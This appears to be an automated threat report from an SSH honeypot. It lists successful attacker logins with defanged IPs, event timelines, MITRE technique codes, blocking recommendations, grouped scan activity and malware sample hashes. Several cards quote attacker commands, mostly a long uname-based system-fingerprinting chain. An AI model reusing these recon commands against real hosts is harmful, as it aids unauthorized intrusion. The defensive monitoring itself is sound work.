| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:43:18` | `cowrie.session.connect` |
| `2026-07-24 08:43:18` | `cowrie.client.version` |
| `2026-07-24 08:43:18` | `cowrie.client.kex` |
| `2026-07-24 08:43:20` | `cowrie.login.success` |
| `2026-07-24 08:43:22` | `cowrie.session.params` |
| `2026-07-24 08:43:22` | `cowrie.command.input` |
| `2026-07-24 08:43:22` | `cowrie.command.input` |
| `2026-07-24 08:43:22` | `cowrie.command.input` |
| `2026-07-24 08:43:22` | `cowrie.command.input` |
| `2026-07-24 08:43:22` | `cowrie.command.input` |
| `2026-07-24 08:43:22` | `cowrie.command.success` |
| `2026-07-24 08:43:22` | `cowrie.command.input` |
| `2026-07-24 08:43:22` | `cowrie.command.input` |
| `2026-07-24 08:43:22` | `cowrie.command.input` |
| `2026-07-24 08:43:22` | `cowrie.command.input` |
| `2026-07-24 08:43:23` | `cowrie.log.closed` |
| `2026-07-24 08:43:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6804b0e8f99f

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 08:43 |
| **Last Seen** | 2026-07-24 08:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:43:38` | `cowrie.session.connect` |
| `2026-07-24 08:43:38` | `cowrie.client.version` |
| `2026-07-24 08:43:38` | `cowrie.client.kex` |
| `2026-07-24 08:43:38` | `cowrie.login.success` |
| `2026-07-24 08:43:39` | `cowrie.session.params` |
| `2026-07-24 08:43:39` | `cowrie.command.input` |
| `2026-07-24 08:43:39` | `cowrie.log.closed` |
| `2026-07-24 08:43:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c8ec6af9703

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 08:45 |
| **Last Seen** | 2026-07-24 08:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:45:19` | `cowrie.session.connect` |
| `2026-07-24 08:45:19` | `cowrie.client.version` |
| `2026-07-24 08:45:19` | `cowrie.client.kex` |
| `2026-07-24 08:45:21` | `cowrie.login.success` |
| `2026-07-24 08:45:22` | `cowrie.session.params` |
| `2026-07-24 08:45:22` | `cowrie.command.input` |
| `2026-07-24 08:45:22` | `cowrie.command.input` |
| `2026-07-24 08:45:22` | `cowrie.command.input` |
| `2026-07-24 08:45:22` | `cowrie.command.input` |
| `2026-07-24 08:45:22` | `cowrie.command.input` |
| `2026-07-24 08:45:22` | `cowrie.command.success` |
| `2026-07-24 08:45:22` | `cowrie.command.input` |
| `2026-07-24 08:45:22` | `cowrie.command.input` |
| `2026-07-24 08:45:22` | `cowrie.command.input` |
| `2026-07-24 08:45:22` | `cowrie.command.input` |
| `2026-07-24 08:45:23` | `cowrie.log.closed` |
| `2026-07-24 08:45:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6434fb79ca29

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 08:45 |
| **Last Seen** | 2026-07-24 08:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:45:28` | `cowrie.session.connect` |
| `2026-07-24 08:45:28` | `cowrie.client.version` |
| `2026-07-24 08:45:28` | `cowrie.client.kex` |
| `2026-07-24 08:45:29` | `cowrie.login.success` |
| `2026-07-24 08:45:30` | `cowrie.session.params` |
| `2026-07-24 08:45:30` | `cowrie.command.input` |
| `2026-07-24 08:45:30` | `cowrie.log.closed` |
| `2026-07-24 08:45:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-105d60258e19

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 08:47 |
| **Last Seen** | 2026-07-24 08:47 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:47:19` | `cowrie.session.connect` |
| `2026-07-24 08:47:20` | `cowrie.client.version` |
| `2026-07-24 08:47:20` | `cowrie.client.kex` |
| `2026-07-24 08:47:21` | `cowrie.login.success` |
| `2026-07-24 08:47:23` | `cowrie.session.params` |
| `2026-07-24 08:47:23` | `cowrie.command.input` |
| `2026-07-24 08:47:23` | `cowrie.command.input` |
| `2026-07-24 08:47:23` | `cowrie.command.input` |
| `2026-07-24 08:47:23` | `cowrie.command.input` |
| `2026-07-24 08:47:23` | `cowrie.command.input` |
| `2026-07-24 08:47:23` | `cowrie.command.success` |
| `2026-07-24 08:47:23` | `cowrie.command.input` |
| `2026-07-24 08:47:23` | `cowrie.command.input` |
| `2026-07-24 08:47:23` | `cowrie.command.input` |
| `2026-07-24 08:47:23` | `cowrie.command.input` |
| `2026-07-24 08:47:24` | `cowrie.log.closed` |
| `2026-07-24 08:47:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f408cf6d5fde

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 08:47 |
| **Last Seen** | 2026-07-24 08:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:47:21` | `cowrie.session.connect` |
| `2026-07-24 08:47:21` | `cowrie.client.version` |
| `2026-07-24 08:47:22` | `cowrie.client.kex` |
| `2026-07-24 08:47:22` | `cowrie.login.success` |
| `2026-07-24 08:47:23` | `cowrie.session.params` |
| `2026-07-24 08:47:23` | `cowrie.command.input` |
| `2026-07-24 08:47:23` | `cowrie.log.closed` |
| `2026-07-24 08:47:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-063b632faf10

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 08:49 |
| **Last Seen** | 2026-07-24 08:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:49:14` | `cowrie.session.connect` |
| `2026-07-24 08:49:14` | `cowrie.client.version` |
| `2026-07-24 08:49:15` | `cowrie.client.kex` |
| `2026-07-24 08:49:15` | `cowrie.login.success` |
| `2026-07-24 08:49:16` | `cowrie.session.params` |
| `2026-07-24 08:49:16` | `cowrie.command.input` |
| `2026-07-24 08:49:16` | `cowrie.log.closed` |
| `2026-07-24 08:49:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c1bbe825836

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 08:49 |
| **Last Seen** | 2026-07-24 08:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:49:16` | `cowrie.session.connect` |
| `2026-07-24 08:49:16` | `cowrie.client.version` |
| `2026-07-24 08:49:16` | `cowrie.client.kex` |
| `2026-07-24 08:49:18` | `cowrie.login.success` |
| `2026-07-24 08:49:19` | `cowrie.session.params` |
| `2026-07-24 08:49:19` | `cowrie.command.input` |
| `2026-07-24 08:49:19` | `cowrie.command.input` |
| `2026-07-24 08:49:19` | `cowrie.command.input` |
| `2026-07-24 08:49:19` | `cowrie.command.input` |
| `2026-07-24 08:49:19` | `cowrie.command.input` |
| `2026-07-24 08:49:19` | `cowrie.command.success` |
| `2026-07-24 08:49:19` | `cowrie.command.input` |
| `2026-07-24 08:49:19` | `cowrie.command.input` |
| `2026-07-24 08:49:19` | `cowrie.command.input` |
| `2026-07-24 08:49:19` | `cowrie.command.input` |
| `2026-07-24 08:49:20` | `cowrie.log.closed` |
| `2026-07-24 08:49:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d17b3a18365

| Field | Detail |
|---|---|
| **Source IP** | `200.58.83[.]79` |
| **First Seen** | 2026-07-24 08:49 |
| **Last Seen** | 2026-07-24 08:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:49:20` | `cowrie.session.connect` |
| `2026-07-24 08:49:21` | `cowrie.client.version` |
| `2026-07-24 08:49:21` | `cowrie.client.kex` |
| `2026-07-24 08:49:23` | `cowrie.login.success` |
| `2026-07-24 08:49:23` | `cowrie.direct-tcpip.request` |
| `2026-07-24 08:49:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.58.83[.]79` to AbuseIPDB if not already reported
- [ ] Block `200.58.83[.]79` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bf2e60bc55e

| Field | Detail |
|---|---|
| **Source IP** | `207.254.22[.]207` |
| **First Seen** | 2026-07-24 08:49 |
| **Last Seen** | 2026-07-24 08:49 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:49:28` | `cowrie.session.connect` |
| `2026-07-24 08:49:29` | `cowrie.client.version` |
| `2026-07-24 08:49:29` | `cowrie.client.kex` |
| `2026-07-24 08:49:30` | `cowrie.login.success` |
| `2026-07-24 08:49:30` | `cowrie.direct-tcpip.request` |
| `2026-07-24 08:49:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.254.22[.]207` to AbuseIPDB if not already reported
- [ ] Block `207.254.22[.]207` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb3ee7d4d320

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 08:51 |
| **Last Seen** | 2026-07-24 08:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:51:02` | `cowrie.session.connect` |
| `2026-07-24 08:51:02` | `cowrie.client.version` |
| `2026-07-24 08:51:02` | `cowrie.client.kex` |
| `2026-07-24 08:51:03` | `cowrie.login.success` |
| `2026-07-24 08:51:03` | `cowrie.session.params` |
| `2026-07-24 08:51:03` | `cowrie.command.input` |
| `2026-07-24 08:51:04` | `cowrie.log.closed` |
| `2026-07-24 08:51:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4f303707f37

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 08:51 |
| **Last Seen** | 2026-07-24 08:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:51:09` | `cowrie.session.connect` |
| `2026-07-24 08:51:09` | `cowrie.client.version` |
| `2026-07-24 08:51:09` | `cowrie.client.kex` |
| `2026-07-24 08:51:11` | `cowrie.login.success` |
| `2026-07-24 08:51:13` | `cowrie.session.params` |
| `2026-07-24 08:51:13` | `cowrie.command.input` |
| `2026-07-24 08:51:13` | `cowrie.command.input` |
| `2026-07-24 08:51:13` | `cowrie.command.input` |
| `2026-07-24 08:51:13` | `cowrie.command.input` |
| `2026-07-24 08:51:13` | `cowrie.command.input` |
| `2026-07-24 08:51:13` | `cowrie.command.success` |
| `2026-07-24 08:51:13` | `cowrie.command.input` |
| `2026-07-24 08:51:13` | `cowrie.command.input` |
| `2026-07-24 08:51:13` | `cowrie.command.input` |
| `2026-07-24 08:51:13` | `cowrie.command.input` |
| `2026-07-24 08:51:13` | `cowrie.log.closed` |
| `2026-07-24 08:51:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47d5f39f9996

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 08:52 |
| **Last Seen** | 2026-07-24 08:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:52:51` | `cowrie.session.connect` |
| `2026-07-24 08:52:51` | `cowrie.client.version` |
| `2026-07-24 08:52:51` | `cowrie.client.kex` |
| `2026-07-24 08:52:52` | `cowrie.login.success` |
| `2026-07-24 08:52:52` | `cowrie.session.params` |
| `2026-07-24 08:52:52` | `cowrie.command.input` |
| `2026-07-24 08:52:52` | `cowrie.log.closed` |
| `2026-07-24 08:52:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a268ed588399

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 08:54 |
| **Last Seen** | 2026-07-24 08:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:54:48` | `cowrie.session.connect` |
| `2026-07-24 08:54:48` | `cowrie.client.version` |
| `2026-07-24 08:54:48` | `cowrie.client.kex` |
| `2026-07-24 08:54:48` | `cowrie.login.success` |
| `2026-07-24 08:54:49` | `cowrie.session.params` |
| `2026-07-24 08:54:49` | `cowrie.command.input` |
| `2026-07-24 08:54:49` | `cowrie.log.closed` |
| `2026-07-24 08:54:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.199.80[.]137` | **9** | 2026-07-24 05:06 | 2026-07-24 08:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | **6** | 2026-07-24 08:32 | 2026-07-24 08:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]162` | **3** | 2026-07-24 07:38 | 2026-07-24 07:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]164` | **3** | 2026-07-24 06:39 | 2026-07-24 06:39 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]167` | **3** | 2026-07-24 05:26 | 2026-07-24 05:26 | 0m | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | **3** | 2026-07-24 06:06 | 2026-07-24 08:28 | 2m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]179` | **3** | 2026-07-24 06:19 | 2026-07-24 06:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]124` | **3** | 2026-07-24 08:07 | 2026-07-24 08:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.238.181[.]92` | **3** | 2026-07-24 06:22 | 2026-07-24 06:22 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]50` | **3** | 2026-07-24 06:42 | 2026-07-24 08:37 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.0[.]142` | **2** | 2026-07-24 07:03 | 2026-07-24 07:05 | 2m | 0 | `T1592` | 🟢 LOW |
| `136.116.189[.]132` | **2** | 2026-07-24 08:50 | 2026-07-24 08:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]137` | **2** | 2026-07-24 05:42 | 2026-07-24 05:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.79.8[.]221` | **2** | 2026-07-24 07:37 | 2026-07-24 08:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `58.216.53[.]130` | **2** | 2026-07-24 05:00 | 2026-07-24 05:02 | 4m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]95` | **2** | 2026-07-24 08:19 | 2026-07-24 08:19 | 0m | 0 | `T1592` | 🟢 LOW |
| `83.255.209[.]245` | **2** | 2026-07-24 06:59 | 2026-07-24 08:05 | 4m | 0 | `T1592` | 🟢 LOW |
| `115.210.161[.]185` | 1 | 2026-07-24 08:32 | 2026-07-24 08:32 | 12s | 0 | `T1592` | 🟢 LOW |
| `121.202.198[.]98` | 1 | 2026-07-24 07:27 | 2026-07-24 07:27 | 6s | 0 | `T1592` | 🟢 LOW |
| `148.74.239[.]144` | 1 | 2026-07-24 06:25 | 2026-07-24 06:25 | 13s | 0 | `T1592` | 🟢 LOW |
| `183.171.15[.]68` | 1 | 2026-07-24 08:07 | 2026-07-24 08:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.44[.]82` | 1 | 2026-07-24 08:43 | 2026-07-24 08:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `193.26.115[.]78` | 1 | 2026-07-24 08:17 | 2026-07-24 08:17 | 1s | 0 | `T1592` | 🟢 LOW |
| `211.220.156[.]232` | 1 | 2026-07-24 06:13 | 2026-07-24 06:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-07-24 07:08 | 2026-07-24 07:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.194.67[.]27` | 1 | 2026-07-24 06:06 | 2026-07-24 06:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]122` | 1 | 2026-07-24 06:37 | 2026-07-24 06:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]214` | 1 | 2026-07-24 07:37 | 2026-07-24 07:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.152[.]228` | 1 | 2026-07-24 05:47 | 2026-07-24 05:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `58.17.6[.]119` | 1 | 2026-07-24 07:10 | 2026-07-24 07:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]212` | 1 | 2026-07-24 04:56 | 2026-07-24 04:57 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]63` | 1 | 2026-07-24 06:41 | 2026-07-24 06:41 | 4s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]183` | 1 | 2026-07-24 06:48 | 2026-07-24 06:48 | 15s | 0 | `T1592` | 🟢 LOW |
| `79.33.232[.]127` | 1 | 2026-07-24 08:35 | 2026-07-24 08:35 | 13s | 0 | `T1592` | 🟢 LOW |
| `8.222.228[.]70` | 1 | 2026-07-24 05:20 | 2026-07-24 05:20 | 8s | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]125` | 1 | 2026-07-24 05:15 | 2026-07-24 05:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `90.84.231[.]142` | 1 | 2026-07-24 06:00 | 2026-07-24 06:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]1` | 1 | 2026-07-24 08:03 | 2026-07-24 08:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]13` | 1 | 2026-07-24 08:03 | 2026-07-24 08:03 | 10s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]14` | 1 | 2026-07-24 08:03 | 2026-07-24 08:03 | 3s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]7` | 1 | 2026-07-24 08:03 | 2026-07-24 08:03 | 1s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
